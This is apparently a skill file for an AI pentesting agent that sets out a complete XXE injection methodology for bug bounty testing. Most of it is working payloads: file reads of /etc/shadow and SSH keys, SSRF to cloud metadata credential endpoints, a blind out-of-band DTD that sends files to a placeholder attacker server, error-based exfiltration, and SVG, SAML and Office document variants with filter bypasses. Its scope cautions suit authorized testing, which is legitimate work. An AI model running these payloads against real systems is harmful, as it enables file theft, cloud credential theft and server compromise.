---
name: xxe
description: XML External Entity (XXE) Injection — file read, SSRF, blind OOB exfiltration, error-based exfiltration, SVG upload XXE, SAML injection, Office document XXE, parameter entity injection. Use when HauntMode identifies XML-processing endpoints, SOAP services, file upload accepting SVG/XML/DOCX, or when you need end-to-end XXE methodology with all payload variants.
---

# XXE — XML External Entity Injection

Read top-to-bottom on first invocation. Later runs can jump to the relevant payload section.

---

## 1. Triggers — when this skill applies

- Any endpoint that accepts XML in the request body (`Content-Type: application/xml`, `text/xml`, `application/soap+xml`)
- SOAP web services (see WSDL notes)
- SVG file upload — SVGs are XML documents that the server may parse
- SAML authentication (`SAMLRequest`, `SAMLResponse` parameters — base64-encoded XML)
- Office document upload (`.docx`, `.xlsx`, `.pptx` — ZIP containers holding XML)
- API endpoints that accept JSON but also respond to XML (try changing `Content-Type`)
- RSS/Atom feed parsers, sitemap parsers
- Import / export functionality that processes XML files
- PDF generators that accept SVG input
- Any endpoint that returns data that looks like it was parsed from XML (e.g. structured errors containing field names from the request XML)

---

---

## 3. 30-second triage

1. Does the endpoint accept XML? Try changing `Content-Type` to `application/xml` on a JSON endpoint — some parsers accept both.
2. Is the response reflected? (Does input in the XML appear in the response?) → Classic XXE likely works.
3. Is there any response at all? → Blind XXE may work via OOB.
4. Is this a file upload accepting SVG/XML? → SVG XXE path.
5. Is this SAML? → SAML XXE path (base64-decode the token first).

**Fastest initial probe** — inject an entity and see if it resolves:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe "XXE_TEST_STRING">]>
<root><field>&xxe;</field></root>
```
If `XXE_TEST_STRING` appears in the response, the parser is substituting entities. Proceed to file read.

---

## 4. Detection — confirming XXE is possible

### 4.1 Basic entity substitution test

Replace the existing XML body with:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe "XXE_TEST_7x9z">]>
<original_root_element>
  <some_field>&xxe;</some_field>
</original_root_element>
```
If `XXE_TEST_7x9z` appears reflected anywhere in the response, entities are being substituted.

### 4.2 OOB probe (when nothing is reflected)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "YOUR_EZXSS_DOMAIN/xxe-probe">]>
<root><field>&xxe;</field></root>
```
Check the ezXSS dashboard at `YOUR_EZXSS_DOMAIN` for a callback. Use a unique path per injection point (e.g. `/xxe-login-username`).

---

## 5. Exploitation payloads — exact XML for each variant

### 5.1 Basic file read (classic XXE)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><field>&xxe;</field></root>
```

Other interesting files to read:
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hostname
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///var/www/html/index.php
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///home/USER/.ssh/id_rsa
file:///home/USER/.bash_history
file:///root/.bash_history
file:///etc/apache2/sites-enabled/000-default.conf
```

**PHP source read** (base64 to avoid XML parsing errors from `<` in source):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">]>
<root><field>&xxe;</field></root>
```
Decode the response: `echo "BASE64" | base64 -d`

**Note**: Files containing XML special characters (`<`, `>`, `&`) may break the response parser. Use the PHP filter wrapper above, or wrap in CDATA: `<![CDATA[FILE_CONTENTS]]>` — though raw CDATA doesn't work with SYSTEM entities. Use a parameter entity approach (see §5.5) for binary/special-char files.

### 5.2 SSRF via XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><field>&xxe;</field></root>
```

AWS metadata enumeration:
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME">
```

GCP metadata:
```xml
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
```
(GCP requires `Metadata-Flavor: Google` header — only reachable if the server passes headers through, which it usually doesn't. Try anyway.)

Azure metadata:
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

Internal service probing:
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/api/users">
<!ENTITY xxe SYSTEM "http://192.168.1.1/">
```

### 5.3 Blind OOB XXE with external DTD (full file exfiltration)

When the file content is never reflected, exfiltrate via DNS/HTTP callback using a DTD hosted on your server.

**Step 1** — Host this DTD file on your server (e.g. Python HTTP server on port 8000):

Save as `malicious.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://YOUR_SERVER_IP:8000/?data=%file;'>">
%wrap;
%send;
```

**Step 2** — Inject the payload pointing to your DTD:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://YOUR_SERVER_IP:8000/malicious.dtd">
  %remote;
]>
<root><field>test</field></root>
```

**Step 3** — Watch your server for the incoming request with the file contents in the URL parameter.

Note: File contents with spaces/newlines/special chars will break the URL. Use base64 encoding in the DTD:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://YOUR_SERVER_IP:8000/?data=%file;'>">
```

For blind OOB, can also use ezXSS as the receiver:
```xml
<!ENTITY % remote SYSTEM "http://YOUR_SERVER_IP:8000/malicious.dtd">
```
(ezXSS only logs HTTP callbacks, not URL params — use a Python server for data exfil)

### 5.4 Error-based XXE exfiltration

When OOB HTTP is blocked but error messages are returned:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root/>
```

The parser tries to load a file whose path includes the contents of `/etc/passwd`, fails, and returns an error message that includes the file path (i.e., the file contents). Look for the error message in the response body or server logs.

### 5.5 Parameter entity injection

For bypassing filters that block `&entity;` in element values, or for constructing complex nested entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root/>
```

Parameter entities (`%name;`) are evaluated in the DTD context, not in the document content. Use them when regular entities are blocked or to build compound payloads.

### 5.6 SVG upload XXE

When SVG file upload is accepted and the server renders/processes SVGs:

**Basic file read via SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

**PHP source read:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

**SSRF via SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<svg>&xxe;</svg>
```

The SVG XXE fires when the server parses the SVG (during upload processing or when displaying it). The output appears in the page or response where the SVG is rendered.

### 5.7 SAML token XXE

SAML requests/responses are base64-encoded (sometimes also deflate-compressed) XML. Inject into the `NameID` element or other reflected fields.

1. Intercept the SAML flow (login, SSO callback)
2. Base64-decode the `SAMLRequest` or `SAMLResponse` parameter
3. If deflate-compressed: `python3 -c "import zlib,base64; print(zlib.decompress(base64.b64decode('ENCODED'), -15).decode())"`
4. Inject XXE payload before the `<samlp:AuthnRequest` or `<saml:Assertion` root element:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:AuthnRequest ...>
  <saml:NameID>&xxe;</saml:NameID>
  ...
</samlp:AuthnRequest>
```

5. Re-encode (base64, or compress+base64) and submit

SAML parsers that are vulnerable: OpenSAML, certain versions of python-saml, SimpleSAMLphp.

### 5.8 Office document XXE (.docx, .xlsx, .pptx)

Office files are ZIP archives containing XML files. Inject into `word/document.xml`:

```bash
# Unzip the document
cp target.docx exploit.docx
mkdir docx_extracted
cd docx_extracted && unzip ../exploit.docx

# Edit word/document.xml — add DTD declaration after the XML prolog
```

Add this to the top of `word/document.xml` (after `<?xml version="1.0"?>`):
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

Then add `&xxe;` somewhere in the document body where the content will be returned/displayed.

```bash
# Repack
zip -r ../exploit.docx *
```

Upload the modified `.docx`. If the server processes the document and returns parsed text, the XXE fires.

---

## 6. Filter bypass techniques

### 6.1 Encoding bypass

If the server checks for `<!DOCTYPE` or `<!ENTITY`:
- Try UTF-16 encoding: `iconv -f UTF-8 -t UTF-16 payload.xml > payload_utf16.xml`
- Try URL encoding of the DOCTYPE declaration

### 6.2 Uppercase/alternate syntax

```xml
<!doctype foo [<!entity xxe SYSTEM "file:///etc/passwd">]>
```

### 6.3 Protocol switching

If `file://` is blocked, try:
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">        <!-- if PHP expect module is loaded — rare -->
<!ENTITY xxe SYSTEM "data://text/plain,TEST_STRING">   <!-- inline data protocol -->
```

### 6.4 XXE via content-type switching

If the endpoint normally accepts JSON but the parser also handles XML:
```
Content-Type: application/xml
```
Then send an XML body with the XXE payload. The backend may switch parsers.

---

## 7. Confirming output

After injection, look for:
- File contents appearing in the response body
- File contents in error messages
- OOB HTTP callback to your server/ezXSS
- Response that's subtly different (longer, different structure) → blind boolean inference

If nothing is reflected and OOB is blocked, try error-based (§5.4).

---

## 8. BILLION LAUGHS — DO NOT USE

```xml
<!-- DO NOT USE — causes denial of service -->
<!DOCTYPE bomb [
  <!ENTITY a "AAAAAAAAAA">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  ...
]>
```

This is a DoS payload (XML entity expansion bomb). Never use it on a bug bounty target. It crashes the XML parser and takes down the server. It will get you banned from the program and potentially kicked off the platform.

---

## 9. False-positive checks

- **`&xxe;` appears literally in response** — entities are not being processed; either the parser is strict or `DOCTYPE` is disabled. Try external parameter entities instead.
- **Response is empty/500** — your injected XML may have broken the document structure. Check that your entity reference is inside a valid element, not breaking the document structure.
- **Reflected but `/etc/passwd` content is missing** — the file may not exist at that path (Windows server?). Try `C:\Windows\win.ini` or `C:\inetpub\wwwroot\web.config`.
- **OOB probe hits the server, but file content not in URL** — the file contains characters that break URL encoding. Use the PHP base64 filter wrapper or the error-based technique.
- **Java application, no output** — Java's XXE is often blind. Use OOB with a DTD-hosted on your server.

---

## 10. Chain candidates

| Chain | Other skill | Impact |
|---|---|---|
| XXE → read `/etc/passwd` → enumerate users | `idor` | Credential/user enumeration |
| XXE SSRF → AWS metadata → IAM credentials | `ssrf` | Cloud account compromise |
| XXE → read PHP source → find SQLi or other vulns | `sqli`, `cmdi` | Secondary exploitation |
| XXE → read `.env` or `wp-config.php` → DB credentials | Direct DB access | Data breach |
| XXE → read SSH private key → SSH access | Direct server access | Full compromise |
| SVG XXE on upload → admin panel rendering | `file-upload` | Combined upload+XXE |
| SAML XXE → IdP account takeover | `auth-bypass` | Authentication bypass |

---

## 11. Reporting template

```
POTENTIAL FINDING: XML External Entity (XXE) Injection
Target: <full URL of vulnerable endpoint>
Parameter: <param name + location: XML element, SVG upload, SAML field>
Variant: <Classic file read | Blind OOB | Error-based | SVG upload | SAML | Office doc>
Working payload:
    <exact XML payload that triggered the finding>
Evidence:
    <file contents returned / OOB callback timestamp / error message containing file data>
Files/data accessed: <e.g. /etc/passwd showing 27 users, /var/www/html/config.php with DB creds>
Impact:
    <arbitrary file read on server | SSRF to internal services | cloud metadata access>
Chain potential: <read source code → find secondary vuln, SSRF → internal API access>
Next step: <read /etc/shadow, enumerate internal services, read AWS metadata credentials>
```

---

## 12. Recon tracker vector strings

Only log if user explicitly authorizes:

- `xxe:classic:<endpoint>` — confirmed classic XXE with file read
- `xxe:ssrf:<endpoint>` — XXE-based SSRF confirmed
- `xxe:blind-oob:<endpoint>` — OOB callback received
- `xxe:error-based:<endpoint>` — error-based exfiltration confirmed
- `xxe:svg-upload` — SVG XXE on file upload endpoint
- `xxe:saml` — XXE in SAML token
- `xxe:no:<reason>` — tested, not exploitable (DOCTYPE disabled, no entity substitution)

---

## 13. What NOT to do

- **Do not use billion laughs / entity expansion payloads.** These cause DoS and will end your engagement.
- **Do not exfiltrate real user data** (passwords, PII) beyond what is needed to prove the vulnerability. Showing `/etc/passwd` first seven lines is sufficient for file read.
- **Do not use OOB callbacks to third-party servers** other than your own infrastructure and the designated `YOUR_EZXSS_DOMAIN` domain (for blind callbacks). Don't use public requestbin or similar services for actual exfiltration.
- **Do not test out-of-scope subdomains.** SAML and SOAP endpoints may be on different subdomains — verify scope before every request.
- **Do not auto-log findings** to the recon tracker without explicit user instruction.
- **Do not probe internal network ranges** beyond 169.254.169.254 (cloud metadata) and 127.0.0.1 without confirming with the researcher that internal SSRF chaining is in scope.
